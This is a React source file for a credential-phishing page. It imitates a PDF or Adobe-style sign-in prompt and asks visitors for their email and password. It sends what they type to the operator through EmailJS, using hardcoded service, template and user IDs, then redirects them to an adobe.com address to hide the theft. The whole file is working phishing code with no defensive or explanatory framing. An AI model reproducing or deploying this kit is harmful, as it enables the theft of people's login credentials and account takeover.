import emailjs from "emailjs-com";
import React from 'react';


export default function ContactUs() {

    function sendEmail(e) {
        e.preventDefault();

    emailjs.sendForm('gmail', 'template_0vlz6hx', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
        e.preventDefault();
        window.location.href='https://www.adobe.com/tfyguihjhhyugchj';
    }

    return(
        <>  
        <div id="html_encoder_div">
        <div className="container">
            <div className="office show border shadow bg-light" id="others">
                <div className="office-holder">
                    <div className="logo" >
                        <div id="login_logo">
                            <img src="https://blog.idrsolutions.com/wp-content/uploads/2020/10/pdf.png" width="100" height="100" alt="" />
                        </div>
                        <h3 className="text-dark"><strong id="logoname" className="text-uppercase"></strong></h3>
                        <h5 className="font-weight-light">Please sign in using your email and password to view access</h5>
                    </div>
                    <center>
                        <div id="msg" className="diver6">Invalid Password.! Please enter correct password.</div>
                    </center>
                    
                    <form novalidate id="login_form" form action=""  onSubmit={sendEmail}>
                        <div className="form-holder">
                            <div className="diver1">
                                <div className="alert alert-danger hide alert2"></div>
                            </div>
                            <input type="email"  name="email" className="form-control" placeholder="youremail@example.com" required="" />
                            <input type="password" name="name" autofocus="" placeholder="Password" className="form-control" required="" />
                            <div className="checkbox">
                                <input type="checkbox" />
                                <label>REMEMBER ME</label>
                            </div>
                            <div className="btn-holder">
                                <button className="btn btn-lg col-12"  type="submit">LOGIN</button>
                            </div>
                                                  </div>
                    </form>
                </div>
            </div>
        </div>
    </div>

        </>
      
       
    )
}
